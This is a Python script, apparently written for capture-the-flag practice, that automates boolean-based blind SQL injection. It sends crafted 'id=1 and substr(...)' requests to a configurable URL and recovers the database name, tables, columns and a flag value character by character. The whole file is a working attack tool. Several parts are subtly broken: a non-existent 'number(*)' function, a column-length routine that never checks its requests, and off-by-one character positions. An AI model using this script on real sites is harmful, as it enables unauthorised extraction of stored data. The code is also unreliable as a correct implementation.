'''Bool Type SQL Injection'''
from http import HTTPStatus
from time import ctime
from typing import Optional
import asyncio
import sys
import httpx

URL = ""
SUCCESS_MARK = ""   #! 页面回显表明查询成功的标志
ASCII_RANGE = range(ord('a'),1+ord('z'))
CLOSE_SYMBOL = ""
STR_RANGE = [123,125] + list(ASCII_RANGE) + list(range(48,58)) #! flag的字符范围列表，包括花括号、a-z，数字0-9
MAX_DATABASE_LENGTH = 20
MAX_TABLE_NUMBER = 20
MAX_TABLE_LENGTH = 20
MAX_COLUMN_NUMBER = 20
MAX_COLUMN_LENGTH = 20
MAX_DATA_LENGTH = 20

async def test(url:str) -> bool:
    '''测试SQL注入语句执行成功与否'''
    success = False
    #!print(url)
    try:
        resp = httpx.get(url)
    except httpx.ConnectError as e:
        print(e)
        return False
    except httpx.ConnectTimeout as e:
        #! 如果是时间盲注则这一步应返回 True
        print(e)
        return False
    else:
        if resp.status_code == HTTPStatus.OK and SUCCESS_MARK in resp.text:
            success = True
        return success

async def get_length_of_database() -> Optional[int]:
    '''获取数据库名字长度'''
    task_list = []
    for i in range(1,MAX_DATABASE_LENGTH):
        task = asyncio.create_task(test(
            f"{URL}?id=1{CLOSE_SYMBOL} and (length(database())={i}) --+"
            ))
        task_list.append(task)

    for index,task in enumerate(task_list):
        if await task:
            return index+1

async def get_database(length_of_database:int) -> str:
    '''获取数据库名'''
    task_list = []
    name = ""
    for i in range(1,length_of_database+1):
        for j in ASCII_RANGE:
            task = asyncio.create_task(test(
                f"{URL}?id=1{CLOSE_SYMBOL} and substr(database(),{i},1)='{chr(j)}' --+"
                ))
            task_list.append((j,task))
    for letter,task in task_list:
        if await task:
            name += chr(letter)
    return name

async def get_number_of_tables(database:str) -> Optional[int]:
    '''获取指定库的表数量'''
    task_list = []
    for i in range(1,MAX_TABLE_NUMBER):
        task = asyncio.create_task(test(
           f"{URL}?id=1{CLOSE_SYMBOL} and (select number(*) from information_schema.tables "+\
               f"where table_schema='{database}')={i} --+"
        ))
        task_list.append(task)
    for index,task in enumerate(task_list):
        if await task:
            return index+1

async def get_length_of_tables(database:str,number_of_tables:int) -> list[int]:
    '''获取指定库所有表的表名长度'''
    length_list=[]
    for i in range(number_of_tables):
        task_list = []
        for length in range(1,MAX_TABLE_LENGTH):
            task = asyncio.create_task(test(
                f"{URL}?id=1{CLOSE_SYMBOL} and "+\
                    "length((select table_name from information_schema.tables "+\
                    f"where table_schema='{database}' limit 1 OFFSET {i}))={length} --+"
            ))
            task_list.append((length,task))
        for length,task in task_list:
            if await task:
                length_list.append(length)
                break
    return length_list

async def get_tables(database:str,number_of_tables:int,length_list:list[int]) -> list[str]:
    '''获取指定库所有表的表名'''
    tables=[]
    for i in range(number_of_tables):
        name = ""
        for length in range(1,length_list[i]+1):
            task_list = []
            for letter in ASCII_RANGE:
                task = asyncio.create_task(test(
                    f"{URL}?id=1{CLOSE_SYMBOL} and "+\
                        "substr((select table_name from information_schema.tables "+\
                        f"where table_schema='{database}' limit 1 "+\
                        f"OFFSET {i}),{length},1)='{chr(letter)}'--+"
                ))
                task_list.append((letter,task))
            for letter,task in task_list:
                if await task:
                    name = name + chr(letter)
                    break
        tables.append(name)
    return tables

async def get_number_of_columns(table:str) -> Optional[int]:
    '''获取指定表的列数量'''
    task_list = []
    for i in range(MAX_COLUMN_NUMBER):
        task = asyncio.create_task(test(
        f"{URL}?id=1{CLOSE_SYMBOL} and "+\
            "(select number(*) from information_schema.columns "+\
            f"where table_name='{table}')={i} --+"
        ))
        task_list.append(task)
    for index,task in enumerate(task_list):
        if await task:
            return index+1

async def get_length_list_of_columns(database:str,table:str,number_of_column:int) -> list[int]:
    '''获取指定库指定表的所有列的列名长度'''
    length_list=[]
    for i in range(number_of_column):
        task_list = []
        for length in range(MAX_COLUMN_LENGTH):
            task = asyncio.create_task(test(
                f"{URL}?id=1{CLOSE_SYMBOL} and "+\
                    "length((select column_name from information_schema.columns "+\
                    f"where table_schema='{database}' and table_name='{table}' "+\
                    f"limit 1 offset {i}))={length}--+"
            ))
        for index,task in enumerate(task_list):
            if await task:
                length_list.append(index)
                break

    return length_list

async def get_columns(
    database:str,table:str,number_of_columns:int,length_list:list[int]
    ) -> list[str]:
    '''获取指定库指定表的所有列名'''
    columns = []
    for i in range(number_of_columns):
        name = ""
        for length in range(1,length_list[i]+1):
            task_list = []
            for letter in ASCII_RANGE:
                task = asyncio.create_task(test(
                f"{URL}?id=1{CLOSE_SYMBOL} and "+\
                    "substr((select column_name from information_schema.columns "+\
                    f"where table_schema='{database}' and "+\
                    f"table_name='{table}' limit 1 OFFSET {i}),{length+1},1)='{chr(letter)}'"
                ))
                task_list.append((letter,task))
            for letter,task in task_list:
                if await task:
                    name = name + chr(letter)
                    break
        columns.append(name)
    return columns

async def get_data(database:str,table:str,column:str):
    '''对指定库指定表指定列爆数据（flag）'''
    for j in range(MAX_DATA_LENGTH):
        task_list = []
        for letter in STR_RANGE:
            task = asyncio.create_task(test(
            f"{URL}?id=1{CLOSE_SYMBOL} and "+\
                f"substr((select {column} from {database}.{table}),{j},1)='{chr(letter)}'"
            ))
            task_list.append((letter,task))
        for letter,task in task_list:
            if await task:
                print(chr(letter),end="")
                if chr(letter) == "}":
                    return

async def main():
    '''entrance of this script'''
    print(f"[*] Sql Injection Started at {ctime()}")
    database_length = await get_length_of_database()
    if not database_length:
        print("[*] Cannot find out the length of the database name")
        sys.exit(0)
    database = await get_database(database_length)
    print(f"[*] Database {database} found")
    print(f"[*] {ctime()}\n[*] Judging the number of tables in the database")
    number_of_tables = await get_number_of_tables(database)
    if not number_of_tables:
        print("[*] Cannot find out the number of the tables")
        sys.exit(0)
    print(f"[*] {ctime()}\n[*] {number_of_tables} tables found")
    print(f"[*] {ctime()}\n[*] Getting the table name")
    length_list_of_tables = await get_length_of_tables(database,number_of_tables)
    tables = await get_tables(database,number_of_tables,length_list_of_tables)
    for i in tables:
        print(f"[*] {i}")
    print(f"[*] {ctime()}\nThe table names in this database are : {tables}")
    i = input("Select the table name:")
    if i not in tables:
        print("Error!")
        exit()
    print()
    print(f"[*] {ctime()}\nGetting the column names in the {i} table")
    number_of_columns = await get_number_of_columns(i)
    if not number_of_columns:
        print("Cannot find out the number of columns")
        sys.exit(0)
    print(f"[*] {ctime()}\nThere are {number_of_columns} tables in the {i} table")
    length_list_of_columns = await get_length_list_of_columns(database,i,number_of_columns)
    columns = await get_columns(database,i,number_of_columns,length_list_of_columns)
    print(f"[*] {ctime()}\nThe column(s) name in {i} table is:{columns}")
    j = input("Select the column name:")
    if j not in columns:
        print("Error!")
        exit()
    print()
    print(f"[*] {ctime()}\nGetting the flag......")
    print(f"[*] {ctime()}\nThe flag is ",end="")
    await get_data(database,i,j)
    print(f"[*] Sql Injection Finished at {ctime()}")


if __name__ == '__main__':
    asyncio.run(main())
